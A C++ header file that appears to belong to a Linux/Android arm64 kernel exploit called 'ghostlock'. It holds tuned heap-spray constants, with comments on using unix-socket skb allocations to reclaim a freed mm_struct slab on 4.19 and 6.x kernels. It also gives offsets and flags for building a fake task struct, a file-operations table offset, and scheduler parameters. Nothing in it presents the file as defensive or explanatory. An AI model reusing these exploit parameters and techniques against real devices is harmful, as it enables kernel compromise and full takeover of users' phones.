#ifndef GHOSTLOCK_KERNEL_CONSTANTS_HPP
#define GHOSTLOCK_KERNEL_CONSTANTS_HPP

#include <cstdint>

#include "kernel/offset.h"

/* NDK r27's <bits/page_size.h> defines a PAGE_SIZE macro that collides with
 * the kernel page-size constant below. Undefine it so the constant wins; the
 * macro is never intended to be used here. */
#undef PAGE_SIZE

namespace ghostlock::kernel {
    inline constexpr unsigned PAGE_SHIFT = 12;
    inline constexpr unsigned long PAGE_SIZE = 1UL << PAGE_SHIFT;
    inline constexpr unsigned KS_PAGE_SIZE = 4096;
    inline constexpr unsigned long long KS_PAGE_MASK = 0xfffULL;

#if defined(GHOSTLOCK_VA39)
    /* 4.19 arm64 vendor (VA_BITS=39).  The spray geometry follows the net core,
 * not the 6.x layout:
 *
 *   unix_stream_sendmsg: size = min(size, (sndbuf>>1)-0x40); then
 *                        size = min(size, 0x8ec0)
 *                        data_len  = min(size, round_up_page(size - 0xec0))
 *                        header_len = size - data_len
 *   __alloc_skb:         alloc = align64(len + 0x140)   (skb_shared_info 0x140)
 *
 * A 0xec0 send therefore yields exactly one 4 KiB head with a 0xec0 data area
 * and no frags - that is the allocation that can reuse a 4 KiB mm_struct slab.
 * Sending 64 KiB (the 6.x value) produces a 0xec0 head plus eight order-0
 * frags, so the payload never lands in one piece.  SKB_DATA_DELTA becomes 0
 * because the head data pointer sits at the allocation start. */
    inline constexpr long long SKB_DATA_DELTA = 0LL;
    inline constexpr unsigned long MM_STRUCT_SZ = 0x400;

    inline constexpr unsigned MM_ORDER = 3;
    inline constexpr unsigned MM_PARTIALS = 5;

    inline constexpr unsigned long ORDER3_SIZE = PAGE_SIZE << MM_ORDER;
    /* 0x8000 - 0x140 (skb_shared_info) keeps kvmalloc(len) inside kmalloc-32k
 * while leaving room for the whole payload (last object ends at 0x1400). */
    inline constexpr unsigned long SKB_SEND_SIZE = 0x7ec0;
#else
    inline constexpr long long SKB_DATA_DELTA = -0xe80LL;
    inline constexpr unsigned long MM_STRUCT_SZ = 0x500;

    inline constexpr unsigned MM_ORDER = 3;
    inline constexpr unsigned MM_PARTIALS = 5;

    inline constexpr unsigned long ORDER3_SIZE = PAGE_SIZE << MM_ORDER;
    inline constexpr unsigned long SKB_SEND_SIZE = ORDER3_SIZE * 2;
#endif
    inline constexpr unsigned SKB_RECLAIM_SENDS = 4;
    inline constexpr unsigned long FOPS_TABLE_OFF = FOPS_OFF;
    inline constexpr int32_t SKB_FRAG_BIAS = 0;

    inline constexpr int32_t FAKE_TASK_PRIO = 120;
    inline constexpr int32_t FAKE_WAITER_PRIO = 140;
    inline constexpr unsigned FAKE_TASK_UCLAMP_REQ_OFF = 0x350;
    inline constexpr unsigned FAKE_TASK_UCLAMP_OFF = 0x358;
    inline constexpr unsigned FAKE_UCLAMP_ACTIVE_BIT = 16;
    inline constexpr unsigned FAKE_UCLAMP_MIN_ACTIVE = 1U << FAKE_UCLAMP_ACTIVE_BIT;
    inline constexpr unsigned FAKE_UCLAMP_MAX_ACTIVE =
            (1024U | (19U << 11) | (1U << FAKE_UCLAMP_ACTIVE_BIT));

    inline constexpr unsigned TASK_COMM_LEN = 16;

    /* `select_stack_route.h` keeps a host-safe fallback macro under this name, so a
 * TU that includes it before common.h must not also declare the constexpr. */
#ifndef PSELECT_ROUTE_NFDS
    inline constexpr unsigned PSELECT_ROUTE_NFDS = 320;
#endif
    inline constexpr int32_t PSELECT_CONSUMER_NICE = 19;
    inline constexpr unsigned PSELECT_CONSUMER_SETTLE_USEC = 250000;

    struct local_sched_attr {
        uint32_t size;
        uint32_t sched_policy;
        uint64_t sched_flags;
        int32_t sched_nice;
        uint32_t sched_priority;
        uint64_t sched_runtime;
        uint64_t sched_deadline;
        uint64_t sched_period;
    };

    /* Measured direct-map end (defaults to the built-in bound). */
    extern uint64_t g_direct_map_end;
} // namespace ghostlock::kernel

#endif
